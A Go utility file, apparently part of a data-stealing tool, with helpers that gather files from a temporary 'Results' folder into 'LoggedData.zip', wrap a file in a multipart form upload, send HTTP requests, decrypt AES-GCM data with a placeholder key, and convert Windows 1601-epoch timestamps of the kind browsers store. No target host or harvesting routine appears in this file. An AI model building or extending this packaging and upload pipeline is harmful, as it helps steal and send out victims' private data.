package utils

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/equisde/Clean/core"
)

func CheckFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	}

	return true
}

func CleanPath(filePath string) string {
	return strings.ReplaceAll(filepath.Clean(filePath), `\`, `/`)
}

func CopyFile(destinationFile, sourceFile string) bool {
	if !CheckFileExist(sourceFile) {
		return false
	}

	dataSourceFile, err := os.Open(sourceFile)
	if err != nil {
		return false
	}
	defer dataSourceFile.Close()

	destSourceFile, err := os.Create(destinationFile)
	if err != nil {
		return false
	}
	defer destSourceFile.Close()

	_, err = io.Copy(destSourceFile, dataSourceFile)
	if err != nil {
		return false
	}

	return true
}

func Compress() error {
	var (
		buff       = new(bytes.Buffer)
		exportDir  = filepath.Join(os.Getenv("TEMP"), "Results")
		exportFile = CleanPath(filepath.Join(exportDir, "LoggedData.zip"))
		zipWriter  = zip.NewWriter(buff)
	)

	filepath.Walk(exportDir, func(file string, fi os.FileInfo, err error) error {
		header, err := zip.FileInfoHeader(fi)
		if err != nil {
			return err
		}

		header.Name = filepath.ToSlash(file)

		if !fi.IsDir() {
			data, err := os.Open(file)
			if err != nil {
				return err
			}
			defer data.Close()

			var folderPath = fi.Name()
			if regexS := regex.FindString(file); len(regexS) > 0 {
				folderPath = strings.Replace(regexS, "Results\\", "", -1) + fi.Name() // TODO: find a better way than this.... (anything is better than this ew.)
			}

			fileWriter, _ := zipWriter.Create(folderPath)
			if _, err := io.Copy(fileWriter, data); err != nil {
				return err
			}
		}

		return nil
	})

	if err := zipWriter.Close(); err != nil {
		return err
	}

	exportedZip, _ := os.Create(exportFile)
	defer exportedZip.Close()

	_, err := buff.WriteTo(exportedZip)
	if err != nil {
		return err
	}

	return nil
}

func CreateWriter(fileName string) (*multipart.Writer, *bytes.Buffer) {
	file, err := os.Open(fileName)
	core.HandleErr(err)
	defer file.Close()

	body := &bytes.Buffer{}
	bodywriter := multipart.NewWriter(body)

	part, err := bodywriter.CreateFormFile("multipart/form-data", filepath.Base(file.Name()))
	core.HandleErr(err)

	io.Copy(part, file)

	return bodywriter, body
}

func Decrypt(base64Encoded string) *bytes.Buffer {
	encodedData, err := base64.StdEncoding.DecodeString(base64Encoded)
	if err != nil {
		return nil
	}

	cipherAES, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}

	AESgcm, err := cipher.NewGCM(cipherAES)
	if err != nil {
		return nil
	}

	contentAfter, err := AESgcm.Open(nil, nonce, encodedData, nil)
	if err != nil {
		return nil
	}

	return bytes.NewBuffer(contentAfter)
}

func HttpRequest(method, url string, body *bytes.Buffer, httpHeaders map[string]string) *http.Response {
	request, err := http.NewRequest(method, url, nil)

	if body != nil {
		request, err = http.NewRequest(method, url, body)
		core.HandleErr(err)
	}

	for headerType, headerValue := range httpHeaders {
		request.Header.Set(headerType, headerValue)
	}

	response, err := http.DefaultClient.Do(request)
	core.HandleErr(err)

	return response
}

func ReadBody(res *http.Response) []byte {
	body, err := ioutil.ReadAll(res.Body)
	core.HandleErr(err)

	return body
}

func Epoch(epoch int64) time.Time {
	maxTime := int64(99633311740000000)
	if epoch > maxTime {
		return time.Date(2049, 1, 1, 1, 1, 1, 1, time.Local)
	}

	t := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	for i := 0; i < 1000; i++ {
		t = t.Add(time.Duration(epoch))
	}
	return t
}

func WriteJSON(fileName string, data interface{}) bool {
	file, err := os.OpenFile(fileName, os.O_RDWR|os.O_CREATE|os.O_TRUNC|os.O_APPEND, 0644)
	if err != nil {
		return false
	}
	defer file.Close()

	w := new(bytes.Buffer)
	enc := json.NewEncoder(w)

	enc.SetEscapeHTML(false)
	enc.SetIndent("", "\t")

	err = enc.Encode(data)
	if err != nil {
		return false
	}

	_, err = file.Write(w.Bytes())
	if err != nil {
		return false
	}

	return true
}

var (
	key   = make([]byte, 32)
	nonce = bytes.Repeat([]byte{69}, 12)
	regex = regexp.MustCompile(`Results\\[\w+]+\\`)
)
